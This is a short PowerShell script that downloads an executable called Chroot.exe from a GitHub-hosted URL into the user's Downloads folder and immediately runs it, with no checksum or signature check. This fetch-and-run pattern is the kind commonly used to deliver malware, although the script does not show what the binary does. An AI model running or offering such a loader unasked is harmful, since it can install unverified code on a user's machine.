$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Chroot.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\Chroot.exe"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $downloadPath)
if (Test-Path $downloadPath) {
    Start-Process -FilePath $downloadPath -Wait
    exit
} else {

}
